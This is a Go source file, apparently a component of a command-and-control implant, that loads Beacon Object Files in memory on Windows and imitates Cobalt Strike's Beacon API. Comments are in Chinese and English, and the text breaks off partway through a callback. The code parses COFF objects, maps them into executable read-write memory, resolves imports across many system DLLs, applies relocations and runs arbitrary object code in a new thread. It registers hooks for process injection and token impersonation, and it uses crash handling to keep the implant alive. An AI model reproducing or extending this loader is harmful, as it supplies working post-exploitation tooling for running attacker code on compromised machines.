//go:build windows && !light

package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── COFF Structures ─────────────────────────────────────────────────────────

const COFF_MACHINE_AMD64 = 0x8664

const (
	IMAGE_REL_AMD64_ADDR64   = 0x0001
	IMAGE_REL_AMD64_ADDR32   = 0x0002
	IMAGE_REL_AMD64_ADDR32NB = 0x0003
	IMAGE_REL_AMD64_REL32    = 0x0004
	IMAGE_REL_AMD64_SECTION  = 0x0005
	IMAGE_REL_AMD64_SECREL   = 0x0006
	IMAGE_REL_AMD64_REL32_1  = 0x0009
	IMAGE_REL_AMD64_REL32_2  = 0x000A
	IMAGE_REL_AMD64_REL32_4  = 0x000B
	IMAGE_REL_AMD64_REL32_5  = 0x000C
)

// IMAGE_SYM_CLASS_WEAK_EXTERNAL: weak external 符号（MSVC 导入符号常用）
const (
	IMAGE_SYM_CLASS_WEAK_EXTERNAL  = 0x69
	IMAGE_WEAK_EXTERN_SEARCH_ALIAS = 0x01
)

// COFF File Header (20 bytes)
type coffHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

// COFF Section Header (40 bytes)
type coffSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

// COFF Relocation (10 bytes for AMD64)
type coffRelocation struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

// COFF Symbol (18 bytes)
type coffSymbol struct {
	Name               [8]byte
	Value              uint32
	SectionNumber      int16
	Type               uint16
	StorageClass       uint8
	NumberOfAuxSymbols uint8
}

// ─── Beacon API State ────────────────────────────────────────────────────────

var (
	beaconOutput       strings.Builder
	beaconOutputMu     sync.Mutex
	beaconState        = &beaconDataParserState{}
	beaconImpersonated bool
)

// beaconDataParserState 跟踪 BOF 数据解析器状态
// 模拟 Cobalt Strike 的 datap 结构体
type beaconDataParserState struct {
	mu       sync.Mutex
	original []byte
	buffer   []byte
	size     int
	pos      int
}

type beaconArgParser struct {
	data []byte
	pos  int
}

// splitBOFArgs 按空格拆分参数，支持 "..." 与 '...' 引号包裹（密码等含空格场景）。
func splitBOFArgs(s string) []string {
	var parts []string
	var cur []rune
	var quote rune
	for _, c := range s {
		switch {
		case quote != 0:
			if c == quote {
				quote = 0
			} else {
				cur = append(cur, c)
			}
		case c == '"' || c == '\'':
			quote = c
		case c == ' ' || c == '\t':
			if len(cur) > 0 {
				parts = append(parts, string(cur))
				cur = nil
			}
		default:
			cur = append(cur, c)
		}
	}
	if len(cur) > 0 {
		parts = append(parts, string(cur))
	}
	return parts
}

// formatBOFArgs 将空格分隔的参数打包为 Cobalt Strike Beacon format：
//
//	[4B 总长度(含前缀)][参数1][参数2]...
//	参数类型（按前缀约定）：
//	  *n   -> short (2B, 小端)
//	  @n   -> int   (4B, 小端)
//	  其他 -> string (4B 长度 + 字节)
//
// BeaconDataParse 会跳过前 4 字节长度前缀，故前缀必须为 4 字节（CS 标准）。
// BOF 内部通过 BeaconDataParse/BeaconDataExtract/BeaconDataInt 解析。
func formatBOFArgs(argsStr string) []byte {
	parts := splitBOFArgs(argsStr)
	var body []byte
	for _, p := range parts {
		switch {
		case len(p) > 1 && p[0] == '*':
			// short
			var v int
			if _, err := fmt.Sscanf(p[1:], "%d", &v); err == nil {
				b := make([]byte, 2)
				binary.LittleEndian.PutUint16(b, uint16(v))
				body = append(body, b...)
			}
		case len(p) > 1 && p[0] == '@':
			// int
			var v int
			if _, err := fmt.Sscanf(p[1:], "%d", &v); err == nil {
				b := make([]byte, 4)
				binary.LittleEndian.PutUint32(b, uint32(v))
				body = append(body, b...)
			}
		default:
			// string
			b := make([]byte, 4)
			binary.LittleEndian.PutUint32(b, uint32(len(p)))
			body = append(body, b...)
			body = append(body, p...)
		}
	}
	if len(body) == 0 {
		return nil
	}
	// 4B 总长度前缀（含自身），与 BeaconDataParse 跳过 4 字节的约定一致
	total := make([]byte, 4)
	binary.LittleEndian.PutUint32(total, uint32(len(body)+4))
	return append(total, body...)
}

// ─── Core BOF Loader ─────────────────────────────────────────────────────────

// loadBOF loads and executes a COFF object file (BOF)
func loadBOF(dataB64 string, args string) (output string, exitCode int32, errOut string) {
	// Top-level recovery: catch any unexpected crash in BOF loading/execution
	defer func() {
		if r := recover(); r != nil {
			output = ""
			exitCode = -1
			errOut = fmt.Sprintf("BOF loader panic: %v", r)
		}
	}()

	data, err := base64.StdEncoding.DecodeString(dataB64)
	if err != nil {
		return "", -1, fmt.Sprintf("BOF base64 decode failed: %v", err)
	}

	if len(data) < 20 {
		return "", -1, "BOF data too short (min 20 bytes for COFF header)"
	}

	// 1. Parse COFF header
	var hdr coffHeader
	reader := newBinReader(data)
	hdr.Machine = reader.u16()
	if hdr.Machine != COFF_MACHINE_AMD64 {
		return "", -1, fmt.Sprintf("BOF unsupported machine: 0x%x (expected 0x8664 for x64)", hdr.Machine)
	}
	hdr.NumberOfSections = reader.u16()
	hdr.TimeDateStamp = reader.u32()
	hdr.PointerToSymbolTable = reader.u32()
	hdr.NumberOfSymbols = reader.u32()
	hdr.SizeOfOptionalHeader = reader.u16()
	hdr.Characteristics = reader.u16()

	// Skip optional header (usually 0 for .obj files)
	reader.skip(int(hdr.SizeOfOptionalHeader))

	// 2. Parse section headers
	sections := make([]coffSectionHeader, hdr.NumberOfSections)
	sectionData := make([][]byte, hdr.NumberOfSections)
	for i := uint16(0); i < hdr.NumberOfSections; i++ {
		sh := coffSectionHeader{}
		copy(sh.Name[:], reader.bytes(8))
		sh.VirtualSize = reader.u32()
		sh.VirtualAddress = reader.u32()
		sh.SizeOfRawData = reader.u32()
		sh.PointerToRawData = reader.u32()
		sh.PointerToRelocations = reader.u32()
		sh.PointerToLinenumbers = reader.u32()
		sh.NumberOfRelocations = reader.u16()
		sh.NumberOfLinenumbers = reader.u16()
		sh.Characteristics = reader.u32()
		sections[i] = sh

		// Read raw section data
		if sh.SizeOfRawData > 0 && sh.PointerToRawData > 0 {
			sectionData[i] = data[sh.PointerToRawData : sh.PointerToRawData+sh.SizeOfRawData]
		} else {
			sectionData[i] = make([]byte, sh.VirtualSize)
		}
	}

	// 3. Parse symbols
	var symbols []coffSymbol
	var stringTable []byte
	var weakExternal map[int]int
	symbols, stringTable, weakExternal = parseSymbols(data, int(hdr.PointerToSymbolTable), int(hdr.NumberOfSymbols))

	// Build symbol name map
	symbolNames := make([]string, len(symbols))
	for i, sym := range symbols {
		symbolNames[i] = getSymbolName(sym, stringTable)
	}

	// 4. Allocate memory for each section and copy data
	sectionBases := make([]uintptr, hdr.NumberOfSections)
	for i, sh := range sections {
		secSize := sh.SizeOfRawData
		if sh.VirtualSize > secSize {
			secSize = sh.VirtualSize
		}
		if secSize == 0 {
			secSize = 4096
		}
		base, err := windows.VirtualAlloc(0, uintptr(secSize), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
		if err != nil {
			cleanupSections(sectionBases[:i])
			return "", -1, fmt.Sprintf("VirtualAlloc failed for section %d: %v", i, err)
		}
		sectionBases[i] = base
		if len(sectionData[i]) > 0 {
			copy((*[1 << 30]byte)(unsafe.Pointer(base))[:len(sectionData[i])], sectionData[i])
		}
	}

	// 5. Resolve external symbols (Beacon API + Windows functions)
	symbolAddrs, unresolved := resolveExternals(symbols, symbolNames, weakExternal)
	// 为 __imp_X 符号创建 IAT 槽（8 字节可读写内存，内存放真实函数地址）。
	// MSVC 编译的 BOF 通过 `call qword ptr [rip+disp32]` 间接调用导入函数，
	// 重定位必须指向槽地址而非函数入口本身，否则会把代码字节读成跳转目标导致崩溃。
	iatSlots, symbolAddrs := createIATSlots(symbols, symbolNames, symbolAddrs)
	defer cleanupBOFMemory(sectionBases, iatSlots)

	// 6. Apply relocations
	if err := applyRelocations(sections, sectionBases, sectionData, data, symbols, symbolNames, symbolAddrs); err != "" {
		return "", -1, fmt.Sprintf("Relocation failed: %s", err)
	}

	// 7. Find "go" entry point
	var entryPoint uintptr
	var foundEntry bool
	for i, sym := range symbols {
		name := symbolNames[i]
		if name == "go" || name == "_go" {
			if sym.SectionNumber > 0 && sym.SectionNumber <= int16(hdr.NumberOfSections) {
				entryPoint = sectionBases[sym.SectionNumber-1] + uintptr(sym.Value)
				foundEntry = true
				break
			}
		}
	}
	if !foundEntry {
		return "", -1, "BOF has no 'go' entry point"
	}

	// 8. Prepare arguments and call entry point
	beaconOutput.Reset()
	beaconOutputMu.Lock()
	defer beaconOutputMu.Unlock()

	// 9. Call the go entry point with (char* args, int len)
	// Standard BOF convention: go(char* buffer, int len)
	// 参数按 Cobalt Strike Beacon format 打包，供 BeaconDataExtract/BeaconDataInt 解析：
	//   [2B 总长度][参数1][参数2]...
	//   字符串参数: 4B 长度 + 数据；短整型: 2B；整型: 4B
	bofBuf := formatBOFArgs(args)
	argLen := len(bofBuf)
	// Warn about unresolved symbols (common cause of crashes)
	var unresolveDiag string
	if len(unresolved) > 0 {
		unresolveDiag = fmt.Sprintf("\n[WARN] Unresolved symbols: %s", strings.Join(unresolved, ", "))
	}

	if crashErr := callEntryPoint(entryPoint, bofBuf, argLen); crashErr != "" {
		return "", -1, crashErr + unresolveDiag
	}

	// 10. Cleanup（由 defer cleanupBOFMemory 统一执行）

	output = beaconOutput.String()
	if output == "" {
		output = "BOF executed (no output)"
	}
	output += unresolveDiag
	return output, 0, ""
}

// ─── Helper: Binary reader ──────────────────────────────────────────────────

type binReader struct {
	data []byte
	pos  int
}

func newBinReader(data []byte) *binReader {
	return &binReader{data: data, pos: 0}
}

func (r *binReader) u16() uint16 {
	val := binary.LittleEndian.Uint16(r.data[r.pos:])
	r.pos += 2
	return val
}

func (r *binReader) u32() uint32 {
	val := binary.LittleEndian.Uint32(r.data[r.pos:])
	r.pos += 4
	return val
}

func (r *binReader) bytes(n int) []byte {
	val := r.data[r.pos : r.pos+n]
	r.pos += n
	return val
}

func (r *binReader) skip(n int) {
	r.pos += n
}

// ─── Symbol table parsing ───────────────────────────────────────────────────

func parseSymbols(data []byte, symTableOffset, numSymbols int) ([]coffSymbol, []byte, map[int]int) {
	// weakExternal: 符号索引 -> 关联符号索引（TagIndex）
	// MSVC 导入符号 __imp_DLL$Func 是 weak external，实际解析应指向 TagIndex 符号
	weakExternal := make(map[int]int)
	if symTableOffset == 0 || numSymbols == 0 {
		return nil, nil, weakExternal
	}

	// 保持符号数组与 COFF 文件索引 1:1 对应（辅助符号也占位）
	symbols := make([]coffSymbol, numSymbols)
	pos := symTableOffset
	for i := 0; i < numSymbols; i++ {
		if pos+18 > len(data) {
			break
		}
		sym := coffSymbol{}
		copy(sym.Name[:], data[pos:pos+8])
		sym.Value = binary.LittleEndian.Uint32(data[pos+8:])
		sym.SectionNumber = int16(binary.LittleEndian.Uint16(data[pos+12:]))
		sym.Type = binary.LittleEndian.Uint16(data[pos+14:])
		sym.StorageClass = data[pos+16]
		sym.NumberOfAuxSymbols = data[pos+17]
		symbols[i] = sym

		// Weak external 符号：第一个辅助符号的前 4 字节是关联符号索引(TagIndex)
		if sym.StorageClass == IMAGE_SYM_CLASS_WEAK_EXTERNAL && sym.NumberOfAuxSymbols > 0 && pos+22 <= len(data) {
			tagIdx := int(binary.LittleEndian.Uint32(data[pos+18:]))
			if tagIdx >= 0 && tagIdx < numSymbols {
				weakExternal[i] = tagIdx
			}
		}

		pos += 18
		// 跳过辅助符号条目
		for a := 0; a < int(sym.NumberOfAuxSymbols); a++ {
			i++
			if i < numSymbols {
				symbols[i] = coffSymbol{} // 占位
				pos += 18
			}
		}
	}

	// String table follows symbol table (4 bytes length + strings)
	stringTable := data[pos:]
	return symbols, stringTable, weakExternal
}

func getSymbolName(sym coffSymbol, stringTable []byte) string {
	// Short name (8 bytes or less)
	if sym.Name[0] != 0 {
		for i, c := range sym.Name {
			if c == 0 {
				return string(sym.Name[:i])
			}
		}
		return string(sym.Name[:])
	}

	// Long name (offset into string table)
	// 字符串表格式: [4B 总长度][string\0]... 合法偏移必须 >= 4
	if len(stringTable) > 4 {
		offset := binary.LittleEndian.Uint32(sym.Name[4:8])
		if int(offset) < 4 || int(offset) >= len(stringTable) {
			return "" // 非法偏移（占位符号/辅助符号），避免返回乱码
		}
		for i := int(offset); i < len(stringTable); i++ {
			if stringTable[i] == 0 {
				return string(stringTable[offset:i])
			}
		}
	}
	return ""
}

// ─── External symbol resolution ─────────────────────────────────────────────

func resolveExternals(symbols []coffSymbol, names []string, weakExternal map[int]int) (addrs []uintptr, unresolved []string) {
	addrs = make([]uintptr, len(symbols))

	// 第一遍：解析所有非 weak external 符号（weak 符号地址由 TagIndex 符号决定）
	for i, sym := range symbols {
		if sym.SectionNumber != 0 || sym.Value != 0 {
			continue // not an undefined external
		}
		if _, isWeak := weakExternal[i]; isWeak {
			continue // 第二遍统一处理
		}
		name := names[i]
		if name == "" {
			continue
		}

		// Beacon API functions
		switch name {
		case "__imp_BeaconOutput", "BeaconOutput":
			addrs[i] = syscall.NewCallback(beaconAPIOuput)
		case "__imp_BeaconPrintf", "BeaconPrintf":
			addrs[i] = syscall.NewCallback(beaconAPIPrintf)
		case "__imp_BeaconDataParse", "BeaconDataParse":
			addrs[i] = syscall.NewCallback(beaconAPIDataParse)
		case "__imp_BeaconDataInt", "BeaconDataInt":
			addrs[i] = syscall.NewCallback(beaconAPIDataInt)
		case "__imp_BeaconDataShort", "BeaconDataShort":
			addrs[i] = syscall.NewCallback(beaconAPIDataShort)
		case "__imp_BeaconDataLength", "BeaconDataLength":
			addrs[i] = syscall.NewCallback(beaconAPIDataLength)
		case "__imp_BeaconDataExtract", "BeaconDataExtract":
			addrs[i] = syscall.NewCallback(beaconAPIDataExtract)
		case "__imp_BeaconIsAdmin", "BeaconIsAdmin":
			addrs[i] = syscall.NewCallback(beaconAPIIsAdmin)
		case "__imp_BeaconGetProcAddress", "BeaconGetProcAddress":
			addrs[i] = syscall.NewCallback(beaconAPIGetProcAddress)
		case "__imp_BeaconGetModuleHandle", "BeaconGetModuleHandle":
			addrs[i] = syscall.NewCallback(beaconAPIGetModuleHandle)
		case "__imp_BeaconInjectProcess", "BeaconInjectProcess":
			addrs[i] = syscall.NewCallback(beaconAPIInjectProcess)
		case "__imp_BeaconInjectTemporaryProcess", "BeaconInjectTemporaryProcess":
			addrs[i] = syscall.NewCallback(beaconAPIInjectTemporaryProcess)
		case "__imp_BeaconSpawnTemporaryProcess", "BeaconSpawnTemporaryProcess":
			addrs[i] = syscall.NewCallback(beaconAPISpawnTemporaryProcess)
		case "__imp_BeaconUseToken", "BeaconUseToken":
			addrs[i] = syscall.NewCallback(beaconAPIUseToken)
		case "__imp_BeaconRevertToken", "BeaconRevertToken":
			addrs[i] = syscall.NewCallback(beaconAPIRevertToken)
		default:
			// Try to resolve as Windows API (kernel32/ntdll/user32)
			addr := resolveWindowsAPI(name)
			if addr != 0 {
				addrs[i] = addr
			} else {
				unresolved = append(unresolved, name)
			}
		}
	}

	// 第二遍：weak external 符号继承 TagIndex 符号的解析地址
	// MSVC 的 __imp_DLL$Func 是 weak external, 其 TagIndex 指向 __imp_Func,
	// 而 __imp_Func 已在第一遍解析为 DLL 中的真实函数地址。
	for i, tagIdx := range weakExternal {
		if i < len(addrs) && tagIdx >= 0 && tagIdx < len(addrs) && addrs[i] == 0 && addrs[tagIdx] != 0 {
			addrs[i] = addrs[tagIdx]
		}
	}
	return addrs, unresolved
}

// apiDLLNames 常用系统 DLL 列表,解析 BOF 外部符号时使用。
// 句柄在首次使用时一次性缓存,避免每个符号都重复 LoadLibrary。
var apiDLLNames = []string{"kernel32.dll", "ntdll.dll", "user32.dll", "advapi32.dll",
	"shell32.dll", "ws2_32.dll", "crypt32.dll", "winhttp.dll", "netapi32.dll",
	"ole32.dll", "oleaut32.dll", "msvcrt.dll", "iphlpapi.dll", "dnsapi.dll",
	"wininet.dll", "wtsapi32.dll", "shlwapi.dll", "version.dll",
	"secur32.dll", "schedsvc.dll", "vaultcli.dll", "samlib.dll",
	"netutils.dll", "dbghelp.dll", "psapi.dll", "wldap32.dll"}

var (
	apiDLLOnce sync.Once
	apiDLLs    = map[string]uintptr{}
)

func loadAPIDLLs() {
	apiDLLOnce.Do(func() {
		for _, dll := range apiDLLNames {
			h, err := windows.LoadLibrary(dll)
			if err == nil {
				apiDLLs[dll] = uintptr(h)
			}
		}
	})
}

func resolveWindowsAPI(name string) uintptr {
	// Strip __imp_ prefix
	funcName := strings.TrimPrefix(name, "__imp_")

	loadAPIDLLs()

	// MSVC 导入符号格式: __imp_DLL$Function 或 DLL$Function
	// 如 __imp_NETAPI32$NetUserAdd -> 从 NETAPI32.dll 导出 NetUserAdd
	if idx := strings.IndexByte(funcName, '$'); idx > 0 {
		dllName := funcName[:idx]
		apiName := funcName[idx+1:]
		// 补充 _ 前缀回退（__imp_NetUserAdd -> _NetUserAdd 场景）
		for _, candidate := range []string{apiName, "_" + apiName} {
			for _, suffix := range []string{".dll", ".DLL"} {
				h, err := windows.LoadLibrary(dllName + suffix)
				if err == nil {
					proc, err2 := windows.GetProcAddress(windows.Handle(h), candidate)
					if err2 == nil && proc != 0 {
						return proc
					}
				}
			}
		}
	}

	// First try exact name
	for _, h := range apiDLLs {
		proc, err := windows.GetProcAddress(windows.Handle(h), funcName)
		if err == nil && proc != 0 {
			return proc
		}
	}

	// Fallback: try _funcName (common for CRT exports like _memset)
	for _, h := range apiDLLs {
		proc, err := windows.GetProcAddress(windows.Handle(h), "_"+funcName)
		if err == nil && proc != 0 {
			return proc
		}
	}

	// Fallback 2: try __imp_funcName (some BOFs use __imp_ prefix without underscore)
	for _, h := range apiDLLs {
		proc, err := windows.GetProcAddress(windows.Handle(h), "__imp_"+funcName)
		if err == nil && proc != 0 {
			return proc
		}
	}

	return 0
}

// createIATSlots 为所有已解析的 __imp_X 符号分配 8 字节 IAT 槽。
// 槽内写入真实函数地址；symbolAddrs 中的对应项改为槽地址，
// 使 `call [rip+disp32]` / `mov rax,[rip+disp32]; call rax` 能正确读取目标。
// 返回槽列表（需随段内存一并释放）与更新后的地址表。
func createIATSlots(symbols []coffSymbol, names []string, addrs []uintptr) ([]uintptr, []uintptr) {
	_ = symbols
	var slots []uintptr
	for i, name := range names {
		if !strings.HasPrefix(name, "__imp_") {
			continue
		}
		if addrs[i] == 0 {
			continue
		}
		slot, err := windows.VirtualAlloc(0, 8, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if err != nil {
			continue
		}
		*(*uintptr)(unsafe.Pointer(slot)) = addrs[i]
		addrs[i] = slot
		slots = append(slots, slot)
	}
	return slots, addrs
}

// ─── Relocation handling ────────────────────────────────────────────────────

func applyRelocations(sections []coffSectionHeader, sectionBases []uintptr,
	sectionData [][]byte, fileData []byte, symbols []coffSymbol,
	symbolNames []string, symbolAddrs []uintptr) string {

	for i, sh := range sections {
		if sh.NumberOfRelocations == 0 || sh.PointerToRelocations == 0 {
			continue
		}

		secBase := sectionBases[i]
		relocPos := int(sh.PointerToRelocations)

		for j := uint16(0); j < sh.NumberOfRelocations; j++ {
			if relocPos+10 > len(fileData) {
				return fmt.Sprintf("relocation data truncated at section %d", i)
			}

			reloc := coffRelocation{
				VirtualAddress:   binary.LittleEndian.Uint32(fileData[relocPos:]),
				SymbolTableIndex: binary.LittleEndian.Uint32(fileData[relocPos+4:]),
				Type:             binary.LittleEndian.Uint16(fileData[relocPos+8:]),
			}
			relocPos += 10

			patchAddr := secBase + uintptr(reloc.VirtualAddress)
			targetSymIdx := int(reloc.SymbolTableIndex)
			if targetSymIdx >= len(symbols) {
				continue
			}

			targetSym := symbols[targetSymIdx]
			var targetAddr uintptr

			if targetSym.SectionNumber > 0 {
				// Symbol in a section
				targetAddr = sectionBases[targetSym.SectionNumber-1] + uintptr(targetSym.Value)
			} else if targetSym.Value != 0 || symbolAddrs[targetSymIdx] != 0 {
				// External symbol or resolved address
				if symbolAddrs[targetSymIdx] != 0 {
					targetAddr = symbolAddrs[targetSymIdx]
				} else {
					targetAddr = uintptr(targetSym.Value)
				}
			} else {
				continue // undefined, skip
			}

			switch reloc.Type {
			case IMAGE_REL_AMD64_ADDR64:
				// COFF 重定位为绝对赋值（.obj 中该位置通常为 0，但规范要求覆盖而非累加）
				*(*uint64)(unsafe.Pointer(patchAddr)) = uint64(targetAddr)
			case IMAGE_REL_AMD64_ADDR32:
				*(*uint32)(unsafe.Pointer(patchAddr)) = uint32(targetAddr)
			case IMAGE_REL_AMD64_ADDR32NB:
				// image-relative 32 位地址（BOF 无映像基址，等价于绝对地址低 32 位）
				*(*uint32)(unsafe.Pointer(patchAddr)) = uint32(targetAddr)
			case IMAGE_REL_AMD64_REL32, IMAGE_REL_AMD64_REL32_1,
				IMAGE_REL_AMD64_REL32_2, IMAGE_REL_AMD64_REL32_4,
				IMAGE_REL_AMD64_REL32_5:
				// RIP-relative: target - (current + 4)，带指令尾随字节偏移
				extra := uintptr(0)
				switch reloc.Type {
				case IMAGE_REL_AMD64_REL32_1:
					extra = 1
				case IMAGE_REL_AMD64_REL32_2:
					extra = 2
				case IMAGE_REL_AMD64_REL32_4:
					extra = 4
				case IMAGE_REL_AMD64_REL32_5:
					extra = 5
				}
				delta := int32(targetAddr - (patchAddr + 4 + extra))
				*(*int32)(unsafe.Pointer(patchAddr)) = delta
			}
		}
	}
	return ""
}

// ─── Entry point calling ────────────────────────────────────────────────────

// VEH crash protection: catches BOF thread crashes to keep implant alive.
var (
	bofVEHOnce   sync.Once
	bofCrashCode string
	bofCrashMu   sync.Mutex
)

// Windows exception structures (not exported by golang.org/x/sys/windows).
// Layout must match EXCEPTION_RECORD / EXCEPTION_POINTERS exactly.
type exceptionRecord struct {
	ExceptionCode    uint32  // +0
	ExceptionFlags   uint32  // +4
	ExceptionRecord  uintptr // +8  (nested, unused)
	ExceptionAddress uintptr // +16
	_                uint32  // +24 NumberParameters
	_                uint32  // +28 __unusedAlignment
}

type exceptionPointers struct {
	ExceptionRecord *exceptionRecord // +0
	ContextRecord   uintptr          // +8 (unused)
}

func installBOFVEH() {
	bofVEHOnce.Do(func() {
		addVEH := resolveAPI("kernel32.dll", "AddVectoredExceptionHandler")
		addVEH.Call(1, syscall.NewCallback(func(info *exceptionPointers) uintptr {
			rec := info.ExceptionRecord
			switch rec.ExceptionCode {
			case 0xC0000005, 0xC000001D, 0xC00000FD,
				0xC000008C, 0xC000008D, 0xC000008E, 0xC000008F,
				0xC0000090, 0xC0000091, 0xC0000092, 0xC0000093,
				0xC0000094, 0xC0000095, 0xC0000096:
				bofCrashMu.Lock()
				bofCrashCode = fmt.Sprintf("EXCEPTION 0x%08X at 0x%016X", rec.ExceptionCode, rec.ExceptionAddress)
				bofCrashMu.Unlock()
				// Terminate just this thread, not the process
				term := resolveAPI("kernel32.dll", "TerminateThread")
				gct := resolveAPI("kernel32.dll", "GetCurrentThread")
				h, _, _ := gct.Call()
				term.Call(h, uintptr(rec.ExceptionCode))
			default:
			}
			return 0 // EXCEPTION_CONTINUE_SEARCH
		}))
	})
}

// bofArgs is passed to the BOF thunk via CreateThread's lpParameter.
type bofArgs struct {
	buf uintptr
	sz  uintptr
}

// callEntryPoint runs the BOF in a separate OS thread via CreateThread.
func callEntryPoint(entryPoint uintptr, args []byte, argsLen int) (crashErr string) {
	installBOFVEH()
	bofCrashMu.Lock()
	bofCrashCode = ""
	bofCrashMu.Unlock()

	defer func() {
		if r := recover(); r != nil {
			crashErr = fmt.Sprintf("BOF execution panic: %v", r)
		}
	}()

	var ba bofArgs
	var argsBuf []byte
	if argsLen > 0 {
		argsBuf = append(args, 0) // null-terminated
		ba.buf = uintptr(unsafe.Pointer(&argsBuf[0]))
		ba.sz = uintptr(argsLen)
	}

	// x64 thunk: unpacks bofArgs struct, calls BOF entry, returns
	thunkCode := []byte{
		0x48, 0x83, 0xEC, 0x28,
		0x48, 0x8B, 0x51, 0x08,
		0x48, 0x8B, 0x09,
		0x48, 0xB8,
	}
	epBytes := (*[8]byte)(unsafe.Pointer(&entryPoint))
	thunkCode = append(thunkCode, epBytes[:]...)
	thunkCode = append(thunkCode,
		0xFF, 0xD0,
		0x33, 0xC0,
		0x48, 0x83, 0xC4, 0x28,
		0xC3,
	)

	tAddr, err := windows.VirtualAlloc(0, uintptr(len(thunkCode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return fmt.Sprintf("VirtualAlloc thunk: %v", err)
	}
	defer windows.VirtualFree(tAddr, 0, windows.MEM_RELEASE)
	copy((*[1 << 30]byte)(unsafe.Pointer(tAddr))[:len(thunkCode)], thunkCode)

	createThr := resolveAPI("kernel32.dll", "CreateThread")
	waitObj := resolveAPI("kernel32.dll", "WaitForSingleObject")
	closeHdl := resolveAPI("kernel32.dll", "CloseHandle")

	th, _, _ := createThr.Call(0, 0, tAddr, uintptr(unsafe.Pointer(&ba)), 0, 0)
	if th == 0 {
		return "CreateThread failed"
	}
	defer closeHdl.Call(th)
	waitObj.Call(th, 0xFFFFFFFF)
	_ = argsBuf

	// Check if VEH caught a crash
	bofCrashMu.Lock()
	crash := bofCrashCode
	bofCrashMu.Unlock()
	if crash != "" {
		return "BOF crashed: " + crash
	}

	return ""
}

// ─── Cleanup ────────────────────────────────────────────────────────────────

func cleanupSections(bases []uintptr) {
	for _, base := range bases {
		if base != 0 {
			windows.VirtualFree(base, 0, windows.MEM_RELEASE)
		}
	}
}

// cleanupBOFMemory 统一释放 BOF 段内存与 IAT 槽。
func cleanupBOFMemory(sectionBases, iatSlots []uintptr) {
	cleanupSections(sectionBases)
	for _, slot := range iatSlots {
		if slot != 0 {
			windows.VirtualFree(slot, 0, windows.MEM_RELEASE)
		}
	}
}

// ─── Beacon API Implementations ─────────────────────────────────────────────

// BeaconOutput(int type, char* data, int len)
func beaconAPIOuput(outputType uintptr, data uintptr, length uintptr) uintptr {
	if data == 0 {
		return 0
	}
	buf := make([]byte, length)
	for i := uintptr(0); i < length; i++ {
		buf[i] = *(*byte)(unsafe.Pointer(data + i))
	}
	beaconOutput.Write(buf)
	return 0
}

// BeaconPrintf(int type, char* fmt, ...)
// NewCallback cannot handle variadic or types > uintptr, so use fixed uintptr params
func beaconAPIPrintf(outputType uintptr, fmtPtr uintptr, a1, a2, a3, a4 uintptr) uintptr {
	if fmtPtr == 0 {
		return 0
	}
	str := cString(fmtPtr)
	// 解析常见 printf 占位符：%s %d %u %x %p %c %%
	// x64 调用约定下变参在 rdx/r8/r9 + 栈，NewCallback 最多拿到前 4 个
	args := []uintptr{a1, a2, a3, a4}
	argIdx := 0
	var sb strings.Builder
	for i := 0; i < len(str); i++ {
		c := str[i]
		if c != '%' {
			sb.WriteByte(c)
			continue
		}
		i++
		if i >= len(str) {
			sb.WriteByte('%')
			break
		}
		switch str[i] {
		case '%':
			sb.WriteByte('%')
		case 's':
			if argIdx < len(args) {
				sb.WriteString(cString(args[argIdx]))
				argIdx++
			}
		case 'd', 'i', 'u':
			if argIdx < len(args) {
				sb.WriteString(fmt.Sprintf("%d", uint64(args[argIdx])))
				argIdx++
			}
		case 'x', 'X', 'p':
			if argIdx < len(args) {
				sb.WriteString(fmt.Sprintf("%x", uint64(args[argIdx])))
				argIdx++
			}
		case 'c':
			if argIdx < len(args) {
				sb.WriteByte(byte(args[argIdx]))
				argIdx++
			}
		default:
			sb.WriteByte('%')
			sb.WriteByte(str[i])
		}
	}
	beaconOutput.WriteString(sb.String())
	return 0
}

// BeaconDataParse(char** parser, char* buffer, int size)
// 初始化解析器：parser 指向一块可写内存，用于存储解析器状态
func beaconAPIDataParse(parserPtr uintptr, buffer uintptr, size uintptr) uintptr {
	beaconState.mu.Lock()
	defer beaconState.mu.Unlock()

	// 将数据复制到内部缓冲区
	if buffer != 0 && size > 0 {
		beaconState.original = make([]byte, size)
		for i := uintptr(0); i < size; i++ {
			beaconState.original[i] = *(*byte)(unsafe.Pointer(buffer + i))
		}
		beaconState.buffer = beaconState.original
	}
	beaconState.size = int(size)
	// CS 标准：跳过前 4 字节长度前缀（formatBOFArgs 生成）
	if size >= 4 {
		beaconState.pos = 4
		beaconState.size = int(size) - 4
	} else {
		beaconState.pos = 0
	}
	return 0
}

// BeaconDataInt(char** parser) -> int
// 从解析器中提取一个 4 字节整数
func beaconAPIDataInt(parserPtr uintptr) uintptr {
	beaconState.mu.Lock()
	defer beaconState.mu.Unlock()

	if beaconState.buffer == nil || beaconState.pos+4 > len(beaconState.buffer) {
		return 0
	}
	val := binary.LittleEndian.Uint32(beaconState.buffer[beaconState.pos:])
	beaconState.pos += 4
	return uintptr(val)
}

// BeaconDataShort(char** parser) -> short
// 从解析器中提取一个 2 字节短整数
func beaconAPIDataShort(parserPtr uintptr) uintptr {
	beaconState.mu.Lock()
	defer beaconState.mu.Unlock()

	if beaconState.buffer == nil || beaconState.pos+2 > len(beaconState.buffer) {
		return 0
	}
	val := binary.LittleEndian.Uint16(beaconState.buffer[beaconState.pos:])
	beaconState.pos += 2
	return uintptr(val)
}

// BeaconDataLength(char** parser) -> int
// 返回解析器剩余未读字节数（CS 语义），不推进 pos。
// BOF 常用它判断是否还有参数可读。
func beaconAPIDataLength(parserPtr uintptr) uintptr {
	beaconState.mu.Lock()
	defer beaconState.mu.Unlock()

	if beaconState.buffer == nil {
		return 0
	}
